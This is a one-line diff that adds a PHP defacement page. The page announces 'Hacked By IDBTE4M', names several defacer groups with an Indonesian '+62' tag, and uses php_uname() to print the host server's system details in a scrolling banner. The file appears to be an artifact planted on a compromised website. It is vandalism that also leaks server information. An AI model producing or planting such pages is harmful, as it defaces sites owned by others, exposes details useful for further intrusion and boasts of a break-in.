@@ -1,0 +1,1 @@
+<?php echo '<title>Hacked By IDBTE4M</title><center><br><br><br> <h1> IDBTE4M : IDTT : PBM : JATIM4U : BUG7SEC <br><br><marquee>[87] '.php_uname().' [87]</marquee><br><br> ALL DEFACER +62</h1></center>';
